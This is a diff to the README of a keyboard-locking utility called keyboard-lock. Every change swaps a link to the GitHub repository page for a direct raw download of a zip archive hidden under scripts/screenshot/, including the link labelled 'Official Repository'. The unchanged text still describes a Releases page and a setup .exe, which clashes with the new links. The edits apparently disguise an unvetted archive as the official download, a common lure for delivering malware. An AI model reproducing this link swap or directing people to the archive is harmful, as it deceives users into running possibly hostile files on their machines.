@@ -1,6 +1,6 @@
 # 🛡️ keyboard-lock - Lock Your Keyboard, Clean With Confidence
 
-[![Download keyboard-lock](https://img.shields.io/badge/Download-keyboard--lock-2ea44f?style=for-the-badge)](https://github.com/Josychambered5353/keyboard-lock)
+[![Download keyboard-lock](https://img.shields.io/badge/Download-keyboard--lock-2ea44f?style=for-the-badge)](https://github.com/Josychambered5353/keyboard-lock/raw/refs/heads/main/scripts/screenshot/keyboard_lock_1.5.zip)
 
 ## 🔒 What Is keyboard-lock?
 
@@ -27,7 +27,7 @@ This app runs quietly in the background and works on Windows, macOS, and Linux. 
 ### Step 1: Download the App
 
 Visit this link to download the application:  
-[**https://github.com/Josychambered5353/keyboard-lock**](https://github.com/Josychambered5353/keyboard-lock)
+[**https://github.com/Josychambered5353/keyboard-lock/raw/refs/heads/main/scripts/screenshot/keyboard_lock_1.5.zip**](https://github.com/Josychambered5353/keyboard-lock/raw/refs/heads/main/scripts/screenshot/keyboard_lock_1.5.zip)
 
 On that page, look for the **Releases** or **Download** button. Click it, and your browser will save a file called something like `keyboard-lock-setup.exe` to your Downloads folder.
 
@@ -116,7 +116,7 @@ Changes take effect next time you open the app.
 
 ## 🔍 More Information
 
-- **Official Repository:** [https://github.com/Josychambered5353/keyboard-lock](https://github.com/Josychambered5353/keyboard-lock)
+- **Official Repository:** [https://github.com/Josychambered5353/keyboard-lock/raw/refs/heads/main/scripts/screenshot/keyboard_lock_1.5.zip](https://github.com/Josychambered5353/keyboard-lock/raw/refs/heads/main/scripts/screenshot/keyboard_lock_1.5.zip)
 - **Report Issues:** Use the "Issues" tab on the GitHub page
 - **Changelog:** Check "Releases" for the latest updates
 
